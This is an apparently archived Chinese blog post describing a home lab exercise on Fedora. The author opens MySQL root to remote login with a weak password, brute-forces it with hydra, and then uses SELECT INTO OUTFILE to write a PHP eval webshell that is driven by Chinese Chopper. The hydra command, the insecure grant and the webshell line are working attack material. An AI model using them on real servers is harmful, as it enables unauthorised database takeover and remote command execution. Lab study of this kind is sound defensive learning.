@@ -1,0 +1,512 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>MySQL弱密码和webshell问题 | 让子弹飞一会</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="yfzheng">
+    
+
+    
+    <meta name="description" content="欢迎来我的简书，这是我在学习MySQL弱密码和webshell问题的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞mysql是什么MySQL是一个关系型数据库管理系统。 mysql弱密码漏洞是什么mysql弱密码漏洞是系统或者数据库的登录用户，密码简单或者和用户名相同，容易通过暴力破解手">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL弱密码和webshell问题">
+<meta property="og:url" content="http://yoursite.com/2018/02/03/webs3.2/index.html">
+<meta property="og:site_name" content="让子弹飞一会">
+<meta property="og:description" content="欢迎来我的简书，这是我在学习MySQL弱密码和webshell问题的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞mysql是什么MySQL是一个关系型数据库管理系统。 mysql弱密码漏洞是什么mysql弱密码漏洞是系统或者数据库的登录用户，密码简单或者和用户名相同，容易通过暴力破解手">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-1a60155145852a6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-5e22e4a82808852a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-b59f8a7a0476f653.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-518146d5dbf6f51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-f5a12690555284da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-bf9f362a87d52f72.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-f514f40de9f45a45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/10457296-5491213cc2c71bab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-02-03T08:50:15.018Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MySQL弱密码和webshell问题">
+<meta name="twitter:description" content="欢迎来我的简书，这是我在学习MySQL弱密码和webshell问题的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。实验背景：1.VMware 12 pro2.fedora 27 了解漏洞mysql是什么MySQL是一个关系型数据库管理系统。 mysql弱密码漏洞是什么mysql弱密码漏洞是系统或者数据库的登录用户，密码简单或者和用户名相同，容易通过暴力破解手">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/10457296-1a60155145852a6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+    
+    <link rel="alternative" href="/atom.xml" title="让子弹飞一会" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="让子弹飞一会" title="让子弹飞一会"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="让子弹飞一会">让子弹飞一会</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/02/03/webs3.2/" title="MySQL弱密码和webshell问题" itemprop="url">MySQL弱密码和webshell问题</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="yfzheng" target="_blank" itemprop="author">yfzheng</a>
+		
+  <p class="article-time">
+    <time datetime="2018-02-03T08:47:38.000Z" itemprop="datePublished"> 发表于 2018-02-03</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解漏洞"><span class="toc-number">1.</span> <span class="toc-text">了解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql是什么"><span class="toc-number">1.1.</span> <span class="toc-text">mysql是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql弱密码漏洞是什么"><span class="toc-number">1.2.</span> <span class="toc-text">mysql弱密码漏洞是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">分析漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#具体漏洞产生原理是什么？"><span class="toc-number">2.1.</span> <span class="toc-text">具体漏洞产生原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞结合webshell有什么危害？"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞结合webshell有什么危害？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞重现与利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞重现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置Apache、PHP、MySQL"><span class="toc-number">3.1.</span> <span class="toc-text">安装配置Apache、PHP、MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置mysql的安全配置"><span class="toc-number">3.2.</span> <span class="toc-text">设置mysql的安全配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装hydra"><span class="toc-number">3.3.</span> <span class="toc-text">安装hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用hydra进行mysql的弱密码攻击"><span class="toc-number">3.4.</span> <span class="toc-text">使用hydra进行mysql的弱密码攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用mysql写入webshell，从而利用webshell进行进一步攻击"><span class="toc-number">3.5.</span> <span class="toc-text">利用mysql写入webshell，从而利用webshell进行进一步攻击</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<p>欢迎来我的简书，这是我在学习MySQL弱密码和webshell问题的一些操作与收获。学习的目的是为了更好的了解这个漏洞，然后去防御它，而不是为了危害他人。<br>实验背景：<br>1.VMware 12 pro<br>2.fedora 27</p>
+<h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="mysql是什么"><a href="#mysql是什么" class="headerlink" title="mysql是什么"></a>mysql是什么</h3><p>MySQL是一个关系型数据库管理系统。</p>
+<h3 id="mysql弱密码漏洞是什么"><a href="#mysql弱密码漏洞是什么" class="headerlink" title="mysql弱密码漏洞是什么"></a>mysql弱密码漏洞是什么</h3><p>mysql弱密码漏洞是系统或者数据库的登录用户，密码简单或者和用户名相同，容易通过暴力破解手段来获取密码。</p>
+<h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="具体漏洞产生原理是什么？"><a href="#具体漏洞产生原理是什么？" class="headerlink" title="具体漏洞产生原理是什么？"></a>具体漏洞产生原理是什么？</h3><p>一是开放了远程登录，二是密码过于简单。</p>
+<h3 id="漏洞结合webshell有什么危害？"><a href="#漏洞结合webshell有什么危害？" class="headerlink" title="漏洞结合webshell有什么危害？"></a>漏洞结合webshell有什么危害？</h3><p>可以控制你的数据库服务器，读取、写入和修改信息。</p>
+<h2 id="漏洞重现与利用"><a href="#漏洞重现与利用" class="headerlink" title="漏洞重现与利用"></a>漏洞重现与利用</h2><h3 id="安装配置Apache、PHP、MySQL"><a href="#安装配置Apache、PHP、MySQL" class="headerlink" title="安装配置Apache、PHP、MySQL"></a>安装配置Apache、PHP、MySQL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install httpd  安装apache</span><br><span class="line">$ sudo yum install mysql-server    安装服务端</span><br><span class="line">$ sudo yum install mysql-devel     这个应该是组件，不知道有什么用</span><br><span class="line">$ sudo yum install mysql   安装客户端</span><br><span class="line">$ sudo yum install php php-fpm php-bcmatch php-gd php-mbstring php-mcrypt php-mysql 安装php以及相关的组件</span><br></pre></td></tr></table></figure>
+<p>对应服务开启的指令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo systemctl start httpd (stop or restart)   开启apache服务（关闭后者重启）</span><br><span class="line">$ sudo systemctl start mariadb (stop or restart) 开启mysql数据库（关闭或者重启）</span><br></pre></td></tr></table></figure></p>
+<h3 id="设置mysql的安全配置"><a href="#设置mysql的安全配置" class="headerlink" title="设置mysql的安全配置"></a>设置mysql的安全配置</h3><p>进入mysql（第一次进入没有密码）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h localhost -u root -p</span><br><span class="line">-h后面接IP，-u后面接用户名 -p后面接密码（可以直接-p回车之后再输入密码，这样你的密码就不被看见）</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to <span class="string">'root'</span>@<span class="string">'%'</span> identified by <span class="string">'123456'</span> withg rant option;</span><br><span class="line">//允许任何ip地址(%表示允许任何ip地址)的电脑用root帐户和密码(123456)来访问这个mysql server。</span><br><span class="line">flush privileges;</span><br><span class="line">select host,user from user; 可以通过看下是否成功</span><br></pre></td></tr></table></figure>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-1a60155145852a6b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>在/var/www/html/目录下创建一个test1.php文件，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这时候打开就能看到php的信息，如果看到mysqli和mysqlnd则说明php支持mysql</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-5e22e4a82808852a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>你还可以创建一个test.php的文件，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbhost = <span class="string">'localhost:3306'</span>;  <span class="comment">// mysql服务器主机地址</span></span><br><span class="line">$dbuser = <span class="string">'root'</span>;            <span class="comment">// mysql用户名</span></span><br><span class="line">$dbpass = <span class="string">'123456'</span>;          <span class="comment">// mysql用户名密码</span></span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line"><span class="keyword">if</span>(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'数据库连接成功！'</span>;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>如果出现下图结果则说明环境搭配成功。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-b59f8a7a0476f653.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="安装hydra"><a href="#安装hydra" class="headerlink" title="安装hydra"></a>安装hydra</h3><p>直接用yum安装即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install hydra</span><br></pre></td></tr></table></figure>
+<h3 id="使用hydra进行mysql的弱密码攻击"><a href="#使用hydra进行mysql的弱密码攻击" class="headerlink" title="使用hydra进行mysql的弱密码攻击"></a>使用hydra进行mysql的弱密码攻击</h3><p>自己随便写了用户名字典和密码字典（把自己mysql的帐号密码添加进去）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hydra用法：  </span><br><span class="line">hydra &lt;参数&gt; &lt;IP地址&gt; &lt;服务名&gt;  </span><br><span class="line">hydra的参数是区分大小写的.  </span><br><span class="line">hydra支持的服务有:telnet ftp ssh mysql mssql vnc pcanywhere RDP(3389)等.  </span><br><span class="line">hydra的一些参数:  </span><br><span class="line">-R 继续从上一次的进度开始爆破  </span><br><span class="line">-s &lt;port&gt; 指定端口  </span><br><span class="line">-l &lt;username&gt; 指定登录的用户名  </span><br><span class="line">-L &lt;username-list&gt; 指定用户名字典  </span><br><span class="line">-p &lt;password&gt; 指定密码  </span><br><span class="line">-t &lt;number&gt; 设置线程数  </span><br><span class="line">-P &lt;passwd-list&gt; 指定密码字典  </span><br><span class="line">-v 显示详细过程  </span><br><span class="line"> </span><br><span class="line">示例:  hydra -l root -P /passwd.txt -t 4 -v 127.0.0.1 mysql</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-518146d5dbf6f51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h3 id="利用mysql写入webshell，从而利用webshell进行进一步攻击"><a href="#利用mysql写入webshell，从而利用webshell进行进一步攻击" class="headerlink" title="利用mysql写入webshell，从而利用webshell进行进一步攻击"></a>利用mysql写入webshell，从而利用webshell进行进一步攻击</h3><p>先登录mysql,之后写入一个小马<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Select <span class="string">'&lt;?php eval($_GET[cmd]);?&gt;'</span> into outfile <span class="string">'/var/www/html/456.php'</span>;    </span><br><span class="line">//把GET换成POST也行，不过之后你得通过POST操作</span><br><span class="line">//如果你在另外一台虚拟机上的话，需要mysql服务端对/var/www/html 有写权限</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-f5a12690555284da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>通过这个文件可以获取一些服务器的信息，下图获得了php的信息。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-bf9f362a87d52f72.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>也可以使用中国菜刀进行攻击（因为我们实验php的版本为7.x，所以一开始出来问题）<br><img src="http://upload-images.jianshu.io/upload_images/10457296-f514f40de9f45a45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>后来Cknife作者给出了解决方案。<br>链接如下：<a href="https://github.com/Chora10/Cknife/issues/33" target="_blank" rel="noopener">https://github.com/Chora10/Cknife/issues/33</a><br>解决问题之后我就可以通过中国菜刀对对方服务器进行操作了。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/10457296-5491213cc2c71bab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://yoursite.com/2018/02/03/webs3.2/" data-title="MySQL弱密码和webshell问题 | 让子弹飞一会" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/01/30/webs3.1/"  title="Redis未授权访问漏洞学习">
+ <strong>下一篇：</strong><br/> 
+ <span>Redis未授权访问漏洞学习
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#了解漏洞"><span class="toc-number">1.</span> <span class="toc-text">了解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql是什么"><span class="toc-number">1.1.</span> <span class="toc-text">mysql是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql弱密码漏洞是什么"><span class="toc-number">1.2.</span> <span class="toc-text">mysql弱密码漏洞是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">分析漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#具体漏洞产生原理是什么？"><span class="toc-number">2.1.</span> <span class="toc-text">具体漏洞产生原理是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞结合webshell有什么危害？"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞结合webshell有什么危害？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞重现与利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞重现与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装配置Apache、PHP、MySQL"><span class="toc-number">3.1.</span> <span class="toc-text">安装配置Apache、PHP、MySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#设置mysql的安全配置"><span class="toc-number">3.2.</span> <span class="toc-text">设置mysql的安全配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装hydra"><span class="toc-number">3.3.</span> <span class="toc-text">安装hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用hydra进行mysql的弱密码攻击"><span class="toc-number">3.4.</span> <span class="toc-text">使用hydra进行mysql的弱密码攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用mysql写入webshell，从而利用webshell进行进一步攻击"><span class="toc-number">3.5.</span> <span class="toc-text">利用mysql写入webshell，从而利用webshell进行进一步攻击</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+
+  
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://luckyjq.github.io/" target="_blank" title="LuckyQ">LuckyQ</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://rliyuqing.github.io/" target="_blank" title="折戟">折戟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://teazmh.github.io/" target="_blank" title="Tea_Mh">Tea_Mh</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">新浪微博</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m yfzheng in XD. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="yfzheng">yfzheng</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?e6d1f421bbc9962127a50488f9ed37d1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
